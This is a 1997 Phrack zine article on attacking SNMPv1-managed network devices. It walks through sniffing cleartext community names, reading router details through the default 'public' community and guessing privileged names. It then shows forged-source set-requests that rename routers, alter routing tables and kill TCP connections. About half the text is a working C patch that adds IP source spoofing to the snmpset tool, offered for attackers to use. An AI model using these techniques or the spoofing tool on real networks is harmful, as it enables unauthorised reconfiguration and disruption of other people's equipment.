@@ -1,0 +1,447 @@
+                                .oO Phrack 50 Oo.
+ 
+                            Volume Seven, Issue Fifty
+ 
+                                     7 of 16
+ 
+                Network Management Protocol Insecurity: SNMPv1
+                                 alhambra [guild]
+                              alhambra@infonexus.com
+ 
+ 
+As networks have become larger and more complex, a need has been felt by 
+certain portions of the network administration crowd to implement network
+management protocols.  From an administrative point of view, this makes
+a lot of sense; centralize the administration of the network, and make it
+convenient and easy for the administrator to monitor and administer changes
+as needed.  As usual, however, from the security point of view, these 
+protocols are a potential for catastrophe.
+ 
+In this article, we'll explore the world of SNMPv1.  In two later articles
+(to be published in later issues of Phrack) we'll look into other network 
+management schemes (SNMPv2, DCE, etc).  SNMPv1 has been around for a while.  
+In fact, a number of the problems outlined in this paper have been fixed
+with the release of SNMPv2.  As usual, however, large networks who placed
+their original administration burdens on SNMPv1 have been slow to change.
+As a result, large corporations, universities, and some small/cheap ISP's 
+still run their routers/hubs/bridges/hosts/etc with version 1 enabled, often
+in horribly set up configurations.  
+
+The SNMP protocol
+ 
+The SNMP protocol has 5 simple types of messages.  They are get-request,
+get-next-request, set-request, get response and trap.  We will concentrate
+on using the get-* messages to retrieve information from remote sites, routers
+and the like, and the set-request to manipulate a variety of settings on our
+target.
+ 
+SNMP uses UDP as it transport mechanism.  The basic layout of an SNMP packet
+is:
++-----------------------------------------------------------------------------+
+|IP |UDP|Version|Community|PDU |Request|err.|err. |name|value|name|value| ... |
+|Hdr|Hdr|       |         |Type|  ID   |stat|index|    |     |    |     |     |
++-----------------------------------------------------------------------------+
+
+Community is SNMP's authentication mechanism.  PDU type is the type of message
+being sent (get-request, set request, etc.)  Request ID is used to 
+differentiate between requests. Error status is (obviously) used to transport 
+error messages, and error index gives the offset of the variable which was in
+error.  Finally, name and value represent the name of the field requested and 
+either the value to set it to or the value of it on the remote server.  These 
+are defined by a MIB written in ASN.1, and encoded using a code called BER. 
+ASN.1 is used to define data and the types and properties of this data.  
+BER is used to actually transmit the data in a platform independent manner 
+(similar perhaps to XDR.)  
+ 
+The values that can be fetched and set via SNMP are defined in what is called
+the Message Information Base or MIB.  The MIB is written in ASN.1, and defines
+all the different variable classes, types, variables and whatnot associated
+with SNMP.  Standard things in the MIB are classes used to define variables
+associated with data for statistics and values for the system as a whole, the
+interfaces on the system, (possibly) an address translation table, IP, TCP,
+UDP, ICMP, and so on, depending on just what kind of system the agent is
+running on. 
+
+Where exactly do SNMPv1's security flaws lie?  We can narrow them down to
+4 general problem areas:
+1) Use of UDP as a transport mechanism
+2) Use of clear text community names and the presence 
+	of default, overpriveleged communities
+3) Information avaialable
+4) Ability to remotely modify parameters.
+
+They're all related to one another.  We'll go through one by one, define
+the problem, and explain how it is exploitable.  Unfortunately, most of 
+SNMPv1 (from here on out, we'll just call it SNMP) problems stem from its 
+design, and have no easy solution barring the move to SNMPv2 or some other 
+network management protocol.  Some common sense, however, can minimize the 
+problems in most situations.
+
+
+
+UDP as a transport mechanism
+
+  I know I'm not alone in feeling that UDP is, at best, a poor idea when
+used in any sort of application that requires any level of security.  The
+fact that UDP is connectionless leads to a myriad of problems with
+regard to host based authentication, which unfortunately enough, SNMP uses
+as one of its mechanisms.  So we have 2 basic attacks due to the fact that
+a UDP transport is used.  First, we can easily spoof packets to a server, and
+modify/add/reconfigure the state of the server.  As we're using a spoofed
+source address, there isn't any way to get the return message, but the 
+machine we are spoofing will simply drop the response message, and the server
+is none the wiser.  Using our 'snmpset' program which has been modified to
+use a raw socket to allow us to forge the source address, we can modify any
+value in the MIB defined as read-write ASSUMING WE HAVE A PRIVELEGED COMMUNITY
+NAME.  
+
+snmpset -v 1 -e 10.0.10.12 router.pitiful.com cisco00\
+        system.sysName.0 s "owned"
+
+Changes our the router name to 'owned', just in case we want to be really
+obvious that this router has crappy security.
+
+But how do we go about getting a legitimate community name?  We have a few
+different methods we can employ.
+
+
+Use of cleartext community names, and default communities
+
+   One of the most laughable things about the SNMP protocol is its 
+"authentication" method.  I use the term authentication in the loosest
+sense only, as it makes me cringe when I think about it.  SNMP only
+can authenticate based on two different elements.  The source address, as
+we saw above, it trivial to forge, rendering address based authentication
+useless.  The second method is the use of "community" names.  Community names
+can be thought of as passwords to the SNMP agent.  As easily as plaintext
+password can be sniffed from telnet, rlogin, ftp and the like, we can sniff
+them from SNMP packets.  As a matter of fact, it's easier, as every SNMP
+packet will have the community name.  Grab your favorite sniffer (sniffer, not
+password sniffer) and head over to your favorite segement running SNMP.  My
+sniffer of choice is 'snoop' so I'll use it as my example, though using any
+other sniffer should be easy.  SNMP uses port 161.  The field we're after, the
+community, is typically 6-8 characters long.  Cranking up snoop on my segment
+reveals the following. (IP's changed to protect the stupid, of course)
+
+# snoop -x 49,15 port 161
+Using device /dev/le (promiscuous mode)
+10.20.48.94 -> 10.20.19.48 UDP D=161 S=1516 LEN=62
+ 
+           0: 0572 3232 3135 a028 0202 009c 0201 0002    .r4485.(.......
+
+There we go.  Using this community name we're able to grab all the info
+we want, and modify all the parameter and whatnot we desire.  Easy enough...
+if you're able to sniff the segment.  But what happens when you can't?
+
+
+Available Information
+
+When you can't sniff the segment, life gets a little more complicated.  But
+only a little.  We have a few things on our side that may come in handy.  
+First off, almost always there is a default 'public' community.  Very few 
+admin's take the time to deactivate this community, nor realize the risk it
+poses.  Using this community, we can usually read all the information we want.
+Quite often, being able to read the information gives us enough clues to
+try to brute force a legitimate community name.
+
+snmpwalk -v 1 router.pitiful.com public system
+will dump the contents of the system table to us, returning something like:
+
+system.sysDescr.0 = "Cisco Internetwork Operating System Software ..IOS (tm) GS
+Software (RSP-K-M), Version 11.0(4), RELEASE SOFTWARE (fc1)..Copyright (c) 1986
+-1995 by cisco Systems, Inc...Compiled Mon 18-Dec-95 22:54 by alanyu"
+system.sysObjectID.0 = OID: enterprises.Cisco.1.45
+system.sysUpTime.0 = Timeticks: (203889196) 23 days, 14:21:31
+system.sysContact.0 = "Jeff Wright"
+system.sysName.0 = "hws"
+system.sysLocation.0 = ""
+system.sysServices.0 = 6
+
+We see that we're dealing with a cisco router, and we see it's contact's name,
+and the system name.  Same as we might do with guessing passwords, we can use
+this information to try to piece together a community name.  Popular favorites
+include stuff like 'admin' 'router' 'gateway' and the like, combined with
+numbers or whatnot.  Trying something like 'routerhws' for the above example
+might work.  It might not.  While failed attempts are noted, very few people,
+if any, ever check for them.  (as it turns out, the above router had a 
+community name of 'cisco00'.  Imaginative, eh?)  
+
+Even if only public works, there's lots of interesting things available via
+SNMP.  We can dump routing tables, connection tables, statistics on router use.
+In certain situations, we can even get information on packet filters in place,
+and access control rules. All are useful information to have in setting up 
+attacks in conventional manners.   Sometimes public is even given r/w on
+certain tables, and we can do most of what we need to do via that account.
+When we do have a priveledged community though, the fun begins.
+
+
+Remote Manipulation via SNMP
+
+We have all the elements we need to remotely configure the network.  We have
+a community name, we have the ability to forge the manager (the SNMP client)
+address.  All we need to figure out is what we can modify.  This really 
+varies.  There are a set of defaults that almost every SNMP'able machine
+will have.  In addition to these, though, are the 'enterprise' MIB's, which
+define vendor specific SNMP tables and fields.  There's really too much to go
+into here.  Check out ftp://ftp.cisco.com/ or ftp://ftp.ascend.com/ , for
+example...most vendors make their MIB's easy to find.  Cisco's web page also
+has a great introduction to their enterprise MIB's, which detail all the
+differences between different IOS release levels and whatnot.
+IN the meantime, though, check out the following as fun places to begin:
+
+system.sysContact   \
+system.sysName       |- really sorta pointless to change, but hey...whatever.
+system.sysLocation  /
+
+interfaces.ifTable.ifAdminStatus.n (where n is a number, starting at 0)
+
+at.atTable.atIfIndex.n
+at.atTable.atPhysAddress.n
+at.atTable.atNetAddress.n
+
+ip.ipForwarding
+ip.ipDefaultTTL
+ip.ipRouteTable.* (there's tons of stuff in this table)
+ip.ipNetToMediaTable.* (same as above)
+
+tcp.tcpConnState.* (only setable to 12, which deletes the TCB)
+
+and so on.  If you have a copy of TCP/IP Illustrated Vol. 1, the SNMP chapter
+will give you a set of tables with the types of all these values.  If you don't
+have TCP/IP Illustrated, get off your computer and go buy it.
+
+Remember, people don't really like it too much when you muck with their 
+equipment.  Act responsibly.  
+
+And to the admins reading this: TURN OFF SNMPv1!  Think about it.  Any time
+you allow control of you network via the network in a manner as unsafe as
+how SNMPv1 does it, you're creating more problems for yourself.  Realizing
+its all about acceptable risks, realize this isn't one.  Go investigate 
+alternate network management software.  Realize, however, there are always
+going to be problems.  (I don't recommend SNMPv2, however...a few months from
+now when I release my SNMPv2 article and tools, you'll be glad you are not
+running it)
+
+Resources:
+The software I use is based on the UCD modifications to the CMU SNMP 
+distribution.  It is available at:
+
+ftp://ftp.ece.ucdavis.edu/pub/snmp/ucd-snmp-3.1.3.tar.gz
+
+Following this article there is a patch, which are the modifications to
+the snmplib to support address spoofing, and modifications to the 'snmpset'
+app to support them.  The patch is only known to work under Solaris, though
+it should take only minor changes to move it to any other platform.
+
+ftp.cisco.com/pub/mibs and ftp.ascend.com/pub/Software-Releases/SNMP/MIBS
+contain the enterprise MIBS for a variety of different pieces of hardware.
+www.cisco.com/univercd/ contains tons of info on a variety of different 
+Cisco hardware and software, including great references on SNMP under IOS.
+
+http://www.cs.tu-bs.de/ibr/cgi-bin/sbrowser.cgi
+
+has a MIB browser, which allows you to use your favorite web client to
+peruse the standard as well as vendor MIBs  on thier site.
+
+RFC's!  Yes!  All of them.  Go to http://www.internic.net/ds/dspg0intdoc.html
+and read them.  Do a search for SNMP and you'll get back tons of hits.  
+They're a little...hrm...terse at times, but these are the defacto definitions
+of SNMP.  Skimming them will give you more info than you can imagine.
+
+
+<++> SNMPv1/snmp.diff
+*** apps/snmpset.c      Mon Jan 20 09:07:22 1997
+-- apps/snmpset.c       Tue Apr  8 17:21:03 1997
+***************
+*** 77,83 ****
+  
+  void
+  usage(){
+!     fprintf(stderr, "Usage: snmpset -v 1 [-q] hostname community [objectID typ
+e value]+    or:\n");
+      fprintf(stderr, "Usage: snmpset [-v 2] [-q] hostname noAuth [objectID type
+ value]+     or:\n");
+      fprintf(stderr, "Usage: snmpset [-v 2] [-q] hostname srcParty dstParty con
+text [oID type val]+\n");
+      fprintf(stderr, "\twhere type is one of: i, s, x, d, n, o, t, a\n");
+--- 77,83 ----
+  
+  void
+  usage(){
+!     fprintf(stderr, "Usage: snmpset -v 1 [-e fakeip] [-q] hostname community [
+objectID type value]+    or:\n");
+      fprintf(stderr, "Usage: snmpset [-v 2] [-q] hostname noAuth [objectID type
+ value]+     or:\n");
+      fprintf(stderr, "Usage: snmpset [-v 2] [-q] hostname srcParty dstParty con
+text [oID type val]+\n");
+      fprintf(stderr, "\twhere type is one of: i, s, x, d, n, o, t, a\n");
+***************
+*** 85,90 ****
+--- 85,93 ----
+      fprintf(stderr, "\t\tn: NULLOBJ, o: OBJID, t: TIMETICKS, a: IPADDRESS\n");
+  }
+  
++ extern char *fakeaddr;
++ extern int nastyflag;
++ 
+  int
+  main(argc, argv)
+      int           argc;
+***************
+*** 152,158 ****
+                          usage();
+                          exit(1);
+                      }
+!                     break;
+                default:
+                    printf("invalid option: -%c\n", argv[arg][1]);
+                    break;
+--- 155,165 ----
+                          usage();
+                          exit(1);
+                      }
+!                   break;
+!               case 'e':
+!                       fakeaddr = argv[++arg];
+!                       nastyflag = 1;
+!                       break;
+                default:
+                    printf("invalid option: -%c\n", argv[arg][1]);
+                    break;
+*** snmplib/snmp_api.c  Mon Jan 20 10:43:20 1997
+-- snmplib/snmp_api.c   Tue Apr  8 17:21:08 1997
+***************
+*** 58,63 ****
+--- 58,71 ----
+  #include <sys/select.h>
+  #endif
+  #include <sys/socket.h>
++ 
++ #include <netinet/in_systm.h>
++ #include <netinet/in.h>
++ #include <netinet/ip_var.h>
++ #include <netinet/ip.h>
++ #include <netinet/udp.h>
++ #include <netinet/udp_var.h>
++  
+  #include <netdb.h>
+  #include "asn1.h"
+  #include "snmp.h"
+***************
+*** 847,852 ****
+--- 855,882 ----
+      }
+      return 0;
+  }
++ /* EVIL STUFF in_cksum for forged ip header */
++ unsigned short in_cksum(addr, len)
++     u_short *addr;
++     int len;
++ {
++     register int nleft = len;
++     register u_short *w = addr;
++     register int sum = 0;
++     u_short answer = 0;
++     while (nleft > 1)  {
++         sum += *w++;
++         nleft -= 2;
++     }
++     if (nleft == 1) {
++         *(u_char *)(&answer) = *(u_char *)w ;
++         sum += answer;
++     }
++     sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
++     sum += (sum >> 16);         /* add carry */
++     answer = ~sum;              /* truncate to 16 bits */
++     return(answer);
++ }
+  
+  /*
+   * Sends the input pdu on the session after calling snmp_build to create
+***************
+*** 857,862 ****
+--- 887,894 ----
+   * On any error, 0 is returned.
+   * The pdu is freed by snmp_send() unless a failure occured.
+   */
++ char *fakeaddr = NULL;
++ int nastyflag = 0;
+  int
+  snmp_send(session, pdu)
+      struct snmp_session *session;
+***************
+*** 1013,1026 ****
+        xdump(packet, length, "");
+          printf("\n\n");
+      }
+  
+! 
+!     if (sendto(isp->sd, (char *)packet, length, 0,
+!              (struct sockaddr *)&pdu->address, sizeof(pdu->address)) < 0){
+!       perror("sendto");
+!       snmp_errno = SNMPERR_GENERR;
+!       return 0;
+!     }
+  /*    gettimeofday(&tv, (struct timezone *)0); */
+      tv = Now;
+      if (pdu->command == GET_REQ_MSG || pdu->command == GETNEXT_REQ_MSG
+--- 1045,1099 ----
+        xdump(packet, length, "");
+          printf("\n\n");
+      }
++    if(nastyflag == 1)
++       {
++         struct ip *ip_hdr;
++         struct udphdr *udp_hdr;
++         char *payload;
++         int socky;
++         struct sockaddr_in dest;
++         payload = (char*) malloc
++                 (sizeof(struct ip)
++                  + (sizeof(struct udphdr)) + length);
++         ip_hdr = (struct ip*) payload;
++         ip_hdr->ip_v=4;
++         ip_hdr->ip_hl=5;
++         ip_hdr->ip_tos=0;
++         ip_hdr->ip_off=0;
++         ip_hdr->ip_id=htons(1+rand()%1000);
++         ip_hdr->ip_ttl=255;
++         ip_hdr->ip_p=IPPROTO_UDP;
++         ip_hdr->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + len
+gth);
++         ip_hdr->ip_src.s_addr = inet_addr(fakeaddr);
++         ip_hdr->ip_dst = pdu->address.sin_addr;
++         ip_hdr->ip_sum = in_cksum(&ip_hdr,sizeof(ip_hdr));
++  
++         udp_hdr = (struct udphdr *) (payload + sizeof(struct ip));
++         udp_hdr->uh_sport = htons(10000+rand()%20000);
++         udp_hdr->uh_dport = htons(161);
++         udp_hdr->uh_ulen = htons(length + sizeof(struct udphdr));
++         udp_hdr->uh_sum = 0;
++         memcpy(payload + sizeof(struct udphdr)+sizeof(struct ip),packet,length
+);
++         dest.sin_family = AF_INET;
++         dest.sin_port = htons(161);
++         dest.sin_addr = pdu->address.sin_addr;
++         socky = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
++         fprintf(stderr,"Payload size:%d sent\n",sendto(socky,payload,28+length
+,0,
++                                      (struct sockaddr *)&dest,sizeof(dest)));
++       exit(0);
+  
+!       }
+!       else
+!       {
+!               if (sendto(isp->sd, (char *)packet, length, 0,
+!                  (struct sockaddr *)&pdu->address, 
+!                          sizeof(pdu->address)) < 0)
+!                 {
+!                       perror("sendto");
+!                       snmp_errno = SNMPERR_GENERR;
+!                       return 0;
+!                 }
+!          }
+  /*    gettimeofday(&tv, (struct timezone *)0); */
+      tv = Now;
+      if (pdu->command == GET_REQ_MSG || pdu->command == GETNEXT_REQ_MSG
+<--> SNMPv1/snmp.diff
